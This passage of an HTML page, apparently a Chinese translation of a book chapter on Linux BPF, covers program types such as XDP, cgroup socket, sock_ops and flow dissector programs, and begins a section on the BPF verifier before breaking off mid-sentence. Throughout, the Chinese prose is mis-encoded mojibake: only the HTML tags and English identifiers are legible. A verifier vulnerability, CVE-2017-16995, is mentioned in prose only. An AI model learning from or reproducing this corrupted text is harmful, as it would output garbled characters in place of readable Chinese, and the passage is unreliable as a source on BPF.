ä¸ªå¯ä»¥æ§åˆ¶çš„æ“ä½œï¼Œå¹¶å…è®¸ä½ å†³å®šå¦‚ä½•å¤„ç†è¯¥æ•°æ®åŒ…ã€‚ä½ å¯ä»¥ä»ä½ çš„XDPç¨‹åºä¸­è¿”å›<code>XDP_PASS</code>ï¼Œè¿™æ„å‘³ç€æ•°æ®åŒ…åº”è¯¥è¢«ä¼ é€’åˆ°å†…æ ¸ä¸­çš„ä¸‹ä¸€ä¸ªå­ç³»ç»Ÿã€‚ä½ è¿˜å¯ä»¥è¿”å›<code>XDP_DROP</code>ï¼Œè¿™æ„å‘³ç€å†…æ ¸åº”è¯¥å®Œå…¨å¿½ç•¥æ­¤æ•°æ®åŒ…ï¼Œå¹¶ä¸”ä¸å¯¹å…¶è¿›è¡Œä»»ä½•å…¶ä»–æ“ä½œã€‚ä½ è¿˜å¯ä»¥è¿”å›<code>XDP_TX</code>ï¼Œè¿™æ„å‘³ç€æ•°æ®åŒ…åº”è¯¥è¢«è½¬å‘å›æœ€åˆæ¥æ”¶æ•°æ®åŒ…çš„ç½‘å¡æ¥å£(NIC)ã€‚</p><p>è¿™ç§çº§åˆ«çš„æ§åˆ¶ä½¿å¾—ç½‘ç»œå±‚çš„å¤„ç†æ›´åŠ çµæ´»ï¼ŒXDPä¹Ÿå·²ç»æˆä¸ºBPFä¸­çš„ä¸»è¦ç»„ä»¶ä¹‹ä¸€ã€‚åœ¨åç»­ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬è¿˜ä¼šè®¨è®ºXDPè®¸å¤šå¼ºå¤§ä¹‹å¤„ï¼Œä¾‹å¦‚ä¿æŠ¤ä½ çš„ç½‘ç»œå…å—åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(DDoS)æ”»å‡»ã€‚</p><h4 id="Perf-Eventç¨‹åº"><a href="#Perf-Eventç¨‹åº" class="headerlink" title="Perf Eventç¨‹åº"></a>Perf Eventç¨‹åº</h4><p>è¿™äº›ç±»å‹çš„BPFç¨‹åºå…è®¸ä½ å°†BPFä»£ç é™„ç€åˆ°<code>Perf events</code>ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_PERF_EVENT</code>ç±»å‹å®šä¹‰ã€‚<code>Perf</code>æ˜¯å†…æ ¸ä¸­çš„ä¸€ä¸ªå†…éƒ¨åˆ†æå™¨ï¼Œå®ƒä¸ºç¡¬ä»¶å’Œè½¯ä»¶å‘å‡ºæ€§èƒ½æ•°æ®äº‹ä»¶ã€‚ä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥ç›‘æ§è®¸å¤šäº‹ç‰©ï¼Œä»è®¡ç®—æœºçš„CPUåˆ°ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»»ä½•è½¯ä»¶ã€‚å½“ä½ å°†BPFç¨‹åºé™„ç€åˆ°<code>Perf events</code>æ—¶ï¼Œä½ çš„ä»£ç å°†åœ¨æ¯æ¬¡<code>Perf</code>ç”Ÿæˆæ•°æ®æ—¶æ‰§è¡Œã€‚</p><h4 id="Cgroup-Socketç¨‹åº"><a href="#Cgroup-Socketç¨‹åº" class="headerlink" title="Cgroup Socketç¨‹åº"></a>Cgroup Socketç¨‹åº</h4><p>è¿™äº›ç±»å‹çš„ç¨‹åºå…è®¸ä½ å°†BPFå¤„ç†é€»è¾‘é™„ç€åˆ°æ§åˆ¶ç»„(cgroups)ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_CGROUP_SKB</code>ç±»å‹å®šä¹‰ã€‚å®ƒä»¬å…è®¸<code>cgroup</code>æ§åˆ¶å®ƒä»¬åŒ…å«çš„è¿›ç¨‹å†…çš„ç½‘ç»œæµé‡ã€‚ä½¿ç”¨è¿™äº›ç¨‹åºå¯ä»¥åœ¨å°†ç½‘ç»œæ•°æ®åŒ…äº¤ä»˜<code>cgroup</code>ä¸­çš„è¿›ç¨‹ä¹‹å‰å†³å®šå¦‚ä½•å¤„ç†å®ƒã€‚å†…æ ¸å°è¯•ä¼ é€’ç»™åŒä¸€<code>cgroup</code>ä¸­çš„ä»»ä½•è¿›ç¨‹çš„ä»»ä½•æ•°æ®åŒ…éƒ½å°†é€šè¿‡è¿™äº›è¿‡æ»¤å™¨ä¹‹ä¸€ã€‚ åŒæ—¶ï¼Œä½ å¯ä»¥å†³å®šå½“<code>cgroup</code>ä¸­çš„è¿›ç¨‹é€šè¿‡è¯¥æ¥å£å‘é€ç½‘ç»œæ•°æ®åŒ…æ—¶è¦åšä»€ä¹ˆã€‚</p><p>ä½ ä¼šå‘ç°ï¼Œè¿™äº›è¡Œä¸ºç±»ä¼¼äº<code>BPF_PROG_TYPE_SOCKET_FILTER</code>ç¨‹åºã€‚ ä¸»è¦åŒºåˆ«åœ¨äº<code>BPF_PROG_TYPE_CGROUP_SKB</code>ç¨‹åºé™„ç€åˆ°ä¸€ä¸ª<code>cgroup</code>å†…çš„æ‰€æœ‰è¿›ç¨‹ï¼Œè€Œä¸æ˜¯ç‰¹å®šè¿›ç¨‹ï¼›è¿™ç§è¡Œä¸ºé€‚ç”¨äºåœ¨ç»™å®š<code>cgroup</code>ä¸­åˆ›å»ºçš„å½“å‰å’Œä»¥åçš„å¥—æ¥å­—ã€‚é™„ç€åˆ°<code>cgroup</code>çš„BPFç¨‹åºåœ¨å®¹å™¨ç¯å¢ƒä¸­éå¸¸æœ‰ç”¨ï¼Œåœ¨è¿™äº›ç¯å¢ƒä¸‹ï¼Œè¿›ç¨‹ç»„å—<code>cgroup</code>çº¦æŸï¼Œå› æ­¤ä½ å¯ä»¥å°†ç›¸åŒçš„ç­–ç•¥åº”ç”¨äºæ‰€æœ‰è¿›ç¨‹ï¼Œè€Œæ— éœ€å•ç‹¬è¯†åˆ«æ¯ä¸ªè¿›ç¨‹ã€‚<code>Cilium</code>æ˜¯ä¸€ä¸ªæµè¡Œçš„å¼€æºé¡¹ç›®ï¼Œå®ƒä¸º<code>Kubernetes</code>æä¾›è´Ÿè½½å‡è¡¡å’Œå®‰å…¨åŠŸèƒ½ï¼Œåœ¨<code>cilium</code>ä¸­ï¼Œå¹¿æ³›ä½¿ç”¨<code>cgroup</code>å¥—æ¥å­—ç¨‹åºå°†å…¶ç­–ç•¥åº”ç”¨äºç»„è€Œä¸æ˜¯å­¤ç«‹çš„å®¹å™¨ä¸­ã€‚</p><h4 id="Cgroup-Open-Socketç¨‹åº"><a href="#Cgroup-Open-Socketç¨‹åº" class="headerlink" title="Cgroup Open Socketç¨‹åº"></a>Cgroup Open Socketç¨‹åº</h4><p>è¿™äº›ç±»å‹çš„ç¨‹åºå…è®¸ä½ åœ¨<code>cgroup</code>ä¸­çš„ä»»ä½•è¿›ç¨‹æ‰“å¼€ç½‘ç»œå¥—æ¥å­—æ—¶æ‰§è¡Œä»£ç ã€‚è¿™ç§è¡Œä¸ºç±»ä¼¼äºé™„ç€åˆ°<code>cgroup</code>å¥—æ¥å­—ç¼“å†²åŒºçš„ç¨‹åºï¼Œä½†ä¸æ˜¯è®©ä½ åœ¨æ•°æ®åŒ…é€šè¿‡ç½‘ç»œæ—¶è®¿é—®å®ƒä»¬ï¼Œè€Œæ˜¯å…è®¸ä½ æ§åˆ¶è¿›ç¨‹æ‰“å¼€æ–°å¥—æ¥å­—æ—¶å‘ç”Ÿçš„æƒ…å†µã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_CGROUP_SOCK</code>ç±»å‹å®šä¹‰ã€‚ è¿™å¯¹äºå¯ä»¥æ‰“å¼€å¥—æ¥å­—çš„ç¨‹åºç»„æä¾›å®‰å…¨æ€§å’Œè®¿é—®æ§åˆ¶å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºè¿™æ ·ä¸å¿…å•ç‹¬é™åˆ¶æ¯ä¸ªè¿›ç¨‹çš„åŠŸèƒ½ã€‚</p><h4 id="Socket-Optionç¨‹åº"><a href="#Socket-Optionç¨‹åº" class="headerlink" title="Socket Optionç¨‹åº"></a>Socket Optionç¨‹åº</h4><p>è¿™äº›ç±»å‹çš„ç¨‹åºå…è®¸ä½ åœ¨è¿è¡Œæ—¶ä¿®æ”¹å¥—æ¥å­—è¿æ¥é€‰é¡¹ï¼Œå½“æ•°æ®åŒ…é€šè¿‡å†…æ ¸ç½‘ç»œå †æ ˆä¸­çš„å¤šä¸ªé˜¶æ®µæ—¶ã€‚å®ƒä»¬é™„ç€åˆ°<code>cgroup</code>ä¸Šï¼Œå¾ˆåƒ<code>BPF_PROG_TYPE_CGROUP_SOCK</code>å’Œ<code>BPF_PROG_TYPE_CGROUP_SKB</code>ï¼Œä½†ä¸é‚£äº›ç¨‹åºç±»å‹ä¸åŒçš„æ˜¯ï¼Œå®ƒä»¬å¯ä»¥åœ¨è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸå†…å¤šæ¬¡è°ƒç”¨ã€‚ è¯¥ç¨‹åºä½¿ç”¨<code>BPF_PROG_TYPE_SOCK_OPS</code>ç±»å‹å®šä¹‰ã€‚</p><p>å½“ä½ åˆ›å»ºä¸€ä¸ªè¿™ç§ç±»å‹çš„BPFç¨‹åºæ—¶ï¼Œä½ çš„å‡½æ•°è°ƒç”¨ä¼šæ”¶åˆ°ä¸€ä¸ªåä¸º<code>op</code>çš„å‚æ•°ï¼Œå®ƒè¡¨ç¤ºå†…æ ¸å°†è¦é€šè¿‡å¥—æ¥å­—è¿æ¥æ‰§è¡Œçš„æ“ä½œï¼Œå› æ­¤ï¼Œä½ å°±ä¼šçŸ¥é“ç¨‹åºåœ¨è¿æ¥ç”Ÿå‘½å‘¨æœŸä¸­çš„å“ªä¸ªæ—¶é—´ç‚¹è¢«è°ƒç”¨ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œä½ å°±å¯ä»¥è®¿é—®ç½‘ç»œIPåœ°å€å’Œè¿æ¥ç«¯å£ç­‰æ•°æ®ï¼Œè¿˜å¯ä»¥ä¿®æ”¹è¿æ¥é€‰é¡¹ä»¥è®¾ç½®è¶…æ—¶å¹¶æ›´æ”¹ç»™å®šæ•°æ®åŒ…çš„å¾€è¿”å»¶è¿Ÿæ—¶é—´ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œ<code>Facebook</code>ä½¿ç”¨å®ƒæ¥ä¸ºåŒä¸€æ•°æ®ä¸­å¿ƒå†…çš„è¿æ¥è®¾ç½®è¾ƒçŸ­çš„è®¾ç½®é‡ä¼ è¶…æ—¶(RTO)ã€‚RTOæ˜¯ç³»ç»Ÿåœ¨ç½‘ç»œè¿æ¥é¢„è®¡å‘ç”Ÿæ•…éšœåæ¢å¤çš„æ—¶é—´ã€‚è¿™ä¸ªç›®æ ‡ä¹Ÿä»£è¡¨äº†ç³»ç»Ÿåœ¨é­å—ä¸å¯è¿æ¥çš„æƒ…å†µä¸‹æ— æ³•ä½¿ç”¨çš„æ—¶é—´ã€‚ åœ¨<code>Facebook</code>çš„æ¡ˆä¾‹ä¸­ï¼Œå®ƒå‡è®¾åŒä¸€æ•°æ®ä¸­å¿ƒä¸­çš„æœºå™¨åº”è¯¥å…·æœ‰è¾ƒçŸ­çš„RTOï¼Œå¹¶ä¸”ä½¿ç”¨ BPF ç¨‹åºä¿®æ”¹äº†è¿™ä¸ªé˜ˆå€¼ã€‚</p><h4 id="Socket-Mapç¨‹åº"><a href="#Socket-Mapç¨‹åº" class="headerlink" title="Socket Mapç¨‹åº"></a>Socket Mapç¨‹åº</h4><p><code>BPF_PROG_TYPE_SK_SKB</code>ç¨‹åºè®©ä½ å¯ä»¥è®¿é—®å¥—æ¥å­—æ˜ å°„å’Œå¥—æ¥å­—é‡å®šå‘ã€‚ å¥—æ¥å­—æ˜ å°„å…è®¸ä½ ä¿ç•™å¯¹å¤šä¸ªå¥—æ¥å­—çš„å¼•ç”¨ã€‚å½“ä½ æœ‰è¿™äº›å¼•ç”¨æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ç‰¹æ®Šçš„å¸®åŠ©å™¨å°†ä¼ å…¥çš„æ•°æ®åŒ…ä»ä¸€ä¸ªå¥—æ¥å­—é‡å®šå‘åˆ°å¦ä¸€ä¸ªå¥—æ¥å­—ã€‚å½“ä½ æƒ³ä½¿ç”¨BPFå®ç°è´Ÿè½½å‡è¡¡åŠŸèƒ½æ—¶ï¼Œå¯ä»¥é€šè¿‡è·Ÿè¸ªå¤šä¸ªå¥—æ¥å­—åœ¨å®ƒä»¬ä¹‹é—´è½¬å‘ç½‘ç»œæ•°æ®åŒ…ï¼Œè€Œæ— éœ€ç¦»å¼€å†…æ ¸ç©ºé—´ã€‚<code>Cillium</code>å’Œ<code>Facebook</code>çš„<code>Katran</code>ç­‰é¡¹ç›®å¹¿æ³›ä½¿ç”¨è¿™äº›ç±»å‹çš„ç¨‹åºæ¥æ§åˆ¶ç½‘ç»œæµé‡ã€‚</p><h4 id="Cgroup-Deviceç¨‹åº"><a href="#Cgroup-Deviceç¨‹åº" class="headerlink" title="Cgroup Deviceç¨‹åº"></a>Cgroup Deviceç¨‹åº</h4><p>è¿™ç§ç±»å‹çš„ç¨‹åºå…è®¸ä½ å†³å®šæ˜¯å¦å¯ä»¥ä¸ºç»™å®šè®¾å¤‡æ‰§è¡Œ<code>cgroup</code>ä¸­çš„æ“ä½œã€‚è¿™äº›ç¨‹åºä½¿ç”¨<code>BPF_PROG_TYPE_CGROUP_DEVICE</code>ç±»å‹å®šä¹‰ã€‚ <code>cgroups (v1)</code>çš„ç¬¬ä¸€ä¸ªå®ç°å…è®¸ä½ ä¸ºç‰¹å®šè®¾å¤‡è®¾ç½®æƒé™ï¼Œç„¶è€Œï¼Œ<code>cgroupsï¼ˆv2ï¼‰</code> ç¼ºå°‘è¿™ä¸ªç‰¹æ€§ã€‚å¼•å…¥è¿™ç§ç±»å‹çš„ç¨‹åºæ˜¯ä¸ºäº†æä¾›è¯¥åŠŸèƒ½ã€‚åŒæ—¶ï¼Œèƒ½å¤Ÿç¼–å†™BPFç¨‹åºå¯ä»¥è®©ä½ åœ¨éœ€è¦æ—¶æ›´çµæ´»åœ°è®¾ç½®è¿™äº›æƒé™ã€‚</p><h4 id="Socket-Message-Deliveryç¨‹åº"><a href="#Socket-Message-Deliveryç¨‹åº" class="headerlink" title="Socket Message Deliveryç¨‹åº"></a>Socket Message Deliveryç¨‹åº</h4><p>è¿™äº›ç±»å‹çš„ç¨‹åºå¯ä»¥æ§åˆ¶æ˜¯å¦åº”è¯¥ä¼ é€’å‘é€åˆ°å¥—æ¥å­—çš„æ¶ˆæ¯ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_SK_MSG</code>ç±»å‹å®šä¹‰ã€‚å½“å†…æ ¸åˆ›å»º<code>socket</code>æ—¶ï¼Œå®ƒä¼šå°†<code>socket</code>å­˜å‚¨åœ¨<code>socket map</code>ä¸­ã€‚è¯¥<code>map</code>ä½¿å†…æ ¸å¯ä»¥å¿«é€Ÿè®¿é—®ç‰¹å®šçš„<code>socket</code>ç»„ã€‚å½“ä½ å°†å¥—æ¥å­—æ¶ˆæ¯çš„BPFç¨‹åºé™„ç€åˆ°<code>socket map</code>æ—¶ï¼Œå‘é€åˆ°è¿™äº›<code>socket</code>çš„æ‰€æœ‰æ¶ˆæ¯éƒ½å°†åœ¨ä¼ é€’å®ƒä»¬ä¹‹å‰è¢«ç¨‹åºè¿‡æ»¤ã€‚åœ¨è¿‡æ»¤æ¶ˆæ¯ä¹‹å‰ï¼Œå†…æ ¸ä¼šå¤åˆ¶æ¶ˆæ¯ä¸­çš„æ•°æ®ï¼Œä»¥ä¾¿å¯ä»¥å¤„ç†å®ƒã€‚è¿™äº›ç¨‹åºæœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼š<code>SK_PASS</code>å’Œ<code>SK_DROP</code>ã€‚ å¦‚æœä½ å¸Œæœ›å†…æ ¸å°†æ¶ˆæ¯å‘é€åˆ°<code>socket</code>ï¼Œåˆ™ä½¿ç”¨ç¬¬ä¸€ä¸ªï¼Œå¦‚æœä½ å¸Œæœ›å†…æ ¸å¿½ç•¥è¯¥æ¶ˆæ¯ï¼Œåˆ™ä½¿ç”¨åä¸€ä¸ªã€‚</p><h4 id="RAW-Tracepointç¨‹åº"><a href="#RAW-Tracepointç¨‹åº" class="headerlink" title="RAW Tracepointç¨‹åº"></a>RAW Tracepointç¨‹åº</h4><p>æˆ‘ä»¬ä¹‹å‰è°ˆåˆ°äº†ä¸€ç§è®¿é—®å†…æ ¸ä¸­è·Ÿè¸ªç‚¹çš„ç¨‹åºã€‚å†…æ ¸å¼€å‘äººå‘˜æ·»åŠ äº†ä¸€ä¸ªæ–°çš„è·Ÿè¸ªç‚¹ç¨‹åºæ¥è§£å†³è®¿é—®å†…æ ¸ä¿å­˜çš„åŸå§‹æ ¼å¼çš„è·Ÿè¸ªç‚¹å‚æ•°ã€‚è¿™ç§æ ¼å¼è®©ä½ å¯ä»¥è®¿é—®æœ‰å…³å†…æ ¸æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡çš„æ›´è¯¦ç»†ä¿¡æ¯ï¼Œä½†æ˜¯ï¼Œå®ƒçš„æ€§èƒ½å¼€é”€å¾ˆå°ã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ä½ ä¼šå¸Œæœ›åœ¨ç¨‹åºä¸­ä½¿ç”¨å¸¸è§„è·Ÿè¸ªç‚¹æ¥é¿å…è¿™ç§æ€§èƒ½å¼€é”€ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨éœ€è¦æ—¶ä½¿ç”¨åŸå§‹è·Ÿè¸ªç‚¹è®¿é—®åŸå§‹å‚æ•°ã€‚è¿™äº›ç±»å‹çš„ç¨‹åºè¢«å®šä¹‰ä¸º<code>BPF_PROG_TYPE_RAW_TRACE POINT</code></p><h4 id="Cgroup-Socket-Addressç¨‹åº"><a href="#Cgroup-Socket-Addressç¨‹åº" class="headerlink" title="Cgroup Socket Addressç¨‹åº"></a>Cgroup Socket Addressç¨‹åº</h4><p>å½“ç”¨æˆ·ç©ºé—´ç¨‹åºç”±ç‰¹å®šçš„<code>cgroup</code>æ§åˆ¶æ—¶ï¼Œè¿™ç§ç±»å‹çš„ç¨‹åºå…è®¸ä½ æ“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæ‰€é™„åŠ çš„IPåœ°å€å’Œç«¯å£å·ã€‚ å½“ä½ å¸Œæœ›ç¡®ä¿ä¸€ç»„ç‰¹å®šçš„ç”¨æˆ·ç©ºé—´ç¨‹åºä½¿ç”¨ç›¸åŒçš„IPåœ°å€å’Œç«¯å£æ—¶ï¼Œä½ çš„ç³»ç»Ÿä¼šä½¿ç”¨å¤šä¸ªIPåœ°å€ã€‚å½“ä½ å°†è¿™äº›ç”¨æˆ·ç©ºé—´ç¨‹åºæ”¾åœ¨åŒä¸€ä¸ª<code>cgroup</code>ä¸­æ—¶ï¼Œè¿™äº›BPFç¨‹åºä½¿ä½ å¯ä»¥çµæ´»åœ°æ“ä½œè¿™äº›ç»‘å®šã€‚è¿™ç¡®ä¿äº†æ¥è‡ªè¿™äº›åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä¼ å…¥å’Œä¼ å‡ºè¿æ¥éƒ½ä½¿ç”¨BPFç¨‹åºæä¾›çš„IPå’Œç«¯å£ã€‚è¿™äº›ç¨‹åºç±»å‹å®šä¹‰ä¸º<code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code></p><h4 id="Socket-Reuseportç¨‹åº"><a href="#Socket-Reuseportç¨‹åº" class="headerlink" title="Socket Reuseportç¨‹åº"></a>Socket Reuseportç¨‹åº</h4><p><code>SO_REUSEPORT</code>æ˜¯å†…æ ¸ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œå®ƒå…è®¸åŒä¸€ä¸»æœºä¸­çš„å¤šä¸ªè¿›ç¨‹ç»‘å®šåˆ°åŒä¸€ç«¯å£ã€‚ å½“ä½ æƒ³è¦è·¨å¤šä¸ªçº¿ç¨‹åˆ†é…è´Ÿè½½æ—¶ï¼Œæ­¤é€‰é¡¹å…è®¸åœ¨æ¥å—çš„ç½‘ç»œè¿æ¥ä¸­è·å¾—æ›´é«˜çš„æ€§èƒ½ã€‚<code>BPF_PROG_TYPE_SK_REUSEPORT</code>ç¨‹åºç±»å‹å…è®¸ä½ ç¼–å†™<code>BPF</code>ç¨‹åº<code>hook</code>åˆ°å†…æ ¸æ¥å†³å®šæ˜¯å¦é‡ç”¨ç«¯å£ã€‚å¦‚æœä½ çš„BPFç¨‹åºè¿”å›<code>SK_DROP</code>ï¼Œä½ å¯ä»¥é˜»æ­¢ç¨‹åºé‡ç”¨åŒä¸€ä¸ªç«¯å£ã€‚å½“BPFç¨‹åºè¿”å›<code>SK_PASS</code>æ—¶ï¼Œä½ å¯ä»¥é€šçŸ¥å†…æ ¸ä½¿ç”¨å®ƒè‡ªå·±çš„é‡ç”¨ä¾‹ç¨‹ã€‚</p><h4 id="Flow-Dissectionç¨‹åº"><a href="#Flow-Dissectionç¨‹åº" class="headerlink" title="Flow Dissectionç¨‹åº"></a>Flow Dissectionç¨‹åº</h4><p>æµè§£æå™¨æ˜¯å†…æ ¸çš„ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒè·Ÿè¸ªç½‘ç»œæ•°æ®åŒ…éœ€è¦é€šè¿‡çš„ä¸åŒå±‚ï¼Œä»åˆ°è¾¾ç³»ç»Ÿåˆ°äº¤ä»˜åˆ°ç”¨æˆ·ç©ºé—´ç¨‹åºã€‚ å®ƒå…è®¸ä½ ä½¿ç”¨ä¸åŒçš„åˆ†ç±»æ–¹æ³•æ¥æ§åˆ¶æ•°æ®åŒ…çš„æµåŠ¨ã€‚å†…æ ¸ä¸­å†…ç½®çš„è§£æå™¨ç§°ä¸º<code>Flower</code>åˆ†ç±»å™¨ï¼Œé˜²ç«å¢™å’Œå…¶ä»–è¿‡æ»¤è®¾å¤‡ä½¿ç”¨å®ƒæ¥å†³å®šå¦‚ä½•å¤„ç†ç‰¹å®šçš„æ•°æ®åŒ…ã€‚</p><p><code>BPF_PROG_TYPE_FLOW_DISSECTOR</code>ç¨‹åºæ—¨åœ¨<code>hook</code>æµè§£æå™¨è·¯å¾„ä¸­çš„é€»è¾‘ã€‚ å®ƒä»¬æä¾›äº†å†…ç½®è§£æå™¨æ— æ³•æä¾›çš„å®‰å…¨ä¿è¯ï¼Œä¾‹å¦‚ç¡®ä¿ç¨‹åºå§‹ç»ˆç»ˆæ­¢ï¼Œè¿™åœ¨å†…ç½®è§£æå™¨ä¸­å¯èƒ½æ— æ³•ä¿è¯ã€‚ è¿™äº›BPFç¨‹åºå¯ä»¥ä¿®æ”¹ç½‘ç»œæ•°æ®åŒ…åœ¨å†…æ ¸ä¸­æ‰€éµå¾ªçš„æµã€‚</p><h4 id="Other-BPFç¨‹åº"><a href="#Other-BPFç¨‹åº" class="headerlink" title="Other BPFç¨‹åº"></a>Other BPFç¨‹åº</h4><p>æˆ‘ä»¬å·²ç»è®¨è®ºäº†åœ¨ä¸åŒç¯å¢ƒä¸­ä½¿ç”¨çš„ç¨‹åºç±»å‹ï¼Œä½†è¿˜æœ‰ä¸€äº›å…¶ä»–çš„BPFç¨‹åºç±»å‹æˆ‘ä»¬è¿˜æ²¡æœ‰æ¶‰åŠã€‚ åœ¨è¿™é‡Œä»…ç®€è¦æåŠ</p><ul><li><p>Traffic classifierç¨‹åº</p><p><code>BPF_PROG_TYPE_SCHED_CLS</code>å’Œ<code>BPF_PROG_TYPE_SCHED_ACT</code>æ˜¯ä¸¤ç§ç±»å‹çš„BPFç¨‹åºï¼Œå®ƒä»¬å…è®¸å¯¹ç½‘ç»œæµé‡è¿›è¡Œåˆ†ç±»å¹¶ä¿®æ”¹å¥—æ¥å­—ç¼“å†²åŒºä¸­æ•°æ®åŒ…çš„æŸäº›å±æ€§ã€‚</p></li><li><p>Lightweight tunnelç¨‹åº</p><p><code>BPF_PROG_TYPE_LWT_INã€BPF_PROG_TYPE_LWT_OUTã€BPF_PROG_TYPE_LWT_XMIT å’Œ BPF_PROG_TYPE_LWT_SEG6LOCAL</code>æ˜¯å…è®¸å°†ä»£ç é™„ç€åˆ°å†…æ ¸çš„è½»é‡çº§éš§é“åŸºç¡€è®¾æ–½çš„BPFç¨‹åºç±»å‹ã€‚</p></li><li><p>Infrared deviceç¨‹åº</p><p><code>BPF_PROG_TYPE_LIRC_MODE2</code>ç¨‹åºå…è®¸é€šè¿‡è¿æ¥åˆ°çº¢å¤–è®¾å¤‡ï¼ˆä¾‹å¦‚é¥æ§å™¨ï¼‰æ¥é™„ç€BPFç¨‹åºã€‚</p></li></ul><p>ä»¥ä¸Šè¿™äº›ç¨‹åºæ˜¯ä¸“é—¨çš„ï¼Œå®ƒä»¬çš„ä½¿ç”¨å°šæœªè¢«ç¤¾åŒºå¹¿æ³›é‡‡ç”¨ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è®¨è®ºBPFå¦‚ä½•ç¡®ä¿ä½ çš„ç¨‹åºåœ¨å†…æ ¸åŠ è½½å®ƒä»¬åä¸ä¼šå¯¼è‡´ç³»ç»Ÿå‘ç”Ÿç¾éš¾æ€§æ•…éšœã€‚</p><h3 id="BPFæ ¡éªŒå™¨"><a href="#BPFæ ¡éªŒå™¨" class="headerlink" title="BPFæ ¡éªŒå™¨"></a>BPFæ ¡éªŒå™¨</h3><p>å…è®¸ä»»ä½•äººåœ¨Linuxå†…æ ¸ä¸­æ‰§è¡Œä»»ä½•ä»£ç ä¹ä¸€å¬æ˜¯ä¸€ä»¶å¾ˆç–¯ç‹‚çš„äº‹æƒ…ã€‚å¦‚æœæ²¡æœ‰BPFéªŒè¯å™¨ï¼Œåœ¨ç”Ÿäº§ç³»ç»Ÿä¸­è¿è¡ŒBPFç¨‹åºçš„é£é™©ä¼šå¤ªé«˜ã€‚ç”¨å†…æ ¸ç½‘ç»œç»´æŠ¤è€…ä¹‹ä¸€<code>Dave S. Miller</code>çš„è¯æ¥è¯´ï¼Œâ€œå”¯ä¸€ä»‹äºeBPFç¨‹åºå’Œä¸€ä¸ªé»‘æš—ç ´åé¸¿æ²Ÿä¹‹é—´çš„æ˜¯eBPFéªŒè¯å™¨ã€‚â€</p><p>æ˜¾ç„¶ï¼ŒBPFéªŒè¯å™¨ä¹Ÿæ˜¯ä¸€ä¸ªè¿è¡Œåœ¨ç³»ç»Ÿä¸Šçš„ç¨‹åºï¼Œå®ƒèƒ½å¤Ÿä»”ç»†å®¡æŸ¥ä»¥ç¡®ä¿æ­£ç¡®å®Œæˆå®ƒçš„å·¥ä½œã€‚åœ¨è¿‡å»å‡ å¹´ä¸­ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜åœ¨éªŒè¯ç¨‹åºä¸­å‘ç°äº†ä¸€äº›æ¼æ´ï¼Œè¿™äº›æ¼æ´å…è®¸æ”»å‡»è€…è®¿é—®å†…æ ¸ä¸­çš„éšæœºå†…å­˜ï¼Œå³ä½¿æ˜¯éç‰¹æƒç”¨æˆ·ã€‚ä½ å¯ä»¥åœ¨CVEç›®å½•ä¸­é˜…è¯»æœ‰å…³æ­¤ç±»æ¼æ´çš„æ›´å¤šä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œ<code>CVE-2017-16995</code>æè¿°äº†ä»»ä½•ç”¨æˆ·å¦‚ä½•è¯»å†™å†…æ ¸å†…å­˜å¹¶ç»•è¿‡BPFéªŒè¯ç¨‹åºã€‚</p><p>éªŒè¯ç¨‹åºæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªæ£€æŸ¥æ˜¯å¯¹è™šæ‹Ÿæœºå°†è¦åŠ è½½çš„ä»£ç çš„é™æ€åˆ†æã€‚ ç¬¬ä¸€æ¬¡æ£€æŸ¥çš„ç›®çš„æ˜¯ç¡®ä¿ç¨‹åºæœ‰é¢„æœŸçš„ç»“æŸã€‚ä¸ºæ­¤ï¼ŒéªŒè¯å™¨ä½¿ç”¨ä»£ç åˆ›å»ºæœ‰å‘æ— ç¯å›¾ (DAG)ã€‚éªŒè¯å™¨åˆ†æçš„æ¯æ¡æŒ‡ä»¤éƒ½æˆä¸ºå›¾ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½é“¾æ¥åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚éªŒè¯å™¨ç”Ÿæˆæ­¤å›¾åï¼Œä¼šæ‰§è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢(DFS)ï¼Œä»¥ç¡®ä¿ç¨‹åºå®Œæˆå¹¶ä¸”ä»£ç ä¸åŒ…å«å±é™©è·¯å¾„ã€‚ è¿™æ„å‘³ç€å®ƒå°†éå†å›¾çš„æ¯ä¸ªåˆ†æ”¯ï¼Œä¸€ç›´åˆ°åˆ†æ”¯çš„åº•éƒ¨ï¼Œä»¥ä¿è¯æ²¡æœ‰é€’å½’å¾ªç¯ã€‚</p><p>ä»¥ä¸‹æ˜¯éªŒè¯å™¨åœ¨ç¬¬ä¸€æ¬¡æ£€æŸ¥æœŸé—´çš„ä¸€äº›æ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸åŒ…æ‹¬æ§åˆ¶å¾ªç¯ã€‚ä¸ºäº†ç¡®ä¿ç¨‹åºä¸ä¼šé™·å…¥æ— é™å¾ªç¯ï¼ŒéªŒè¯å™¨æ‹’ç»ä»»ä½•ç±»å‹çš„æ§åˆ¶å¾ªç¯ã€‚å·²ç»æœ‰äººæè®®åœ¨ BPF 